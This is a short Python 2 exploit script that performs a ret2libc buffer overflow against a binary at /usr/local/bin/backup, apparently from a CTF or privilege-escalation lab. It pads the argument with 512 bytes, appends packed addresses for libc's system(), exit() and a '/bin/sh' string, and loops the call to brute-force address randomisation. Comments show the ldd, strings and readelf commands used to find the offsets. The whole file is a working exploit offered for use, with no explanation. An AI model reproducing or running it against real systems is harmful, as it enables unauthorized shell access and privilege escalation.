from subprocess import call
import struct;
libc       =0xf757b000;
arg_off    =0x0015900b;#/bin/sh
system_off =0x0003a940;
exit_off   =0x00033260;
system_addr=struct.pack("<I",libc+system_off);
exit_addr=struct.pack("<I",libc+exit_off);
arg_addr=struct.pack("<I",libc+arg_off);
val="A"*512;
#nop="\x90"*100;
#val+=nop;
val+=system_addr;
val+=exit_addr;
val+=arg_addr;
i=0;
while(i<512):
	print "try",i;
	i+=1;
	ret=call(["/usr/local/bin/backup",val]);


#ldd /file/ | grep libc.so.6
#strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep system
#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit



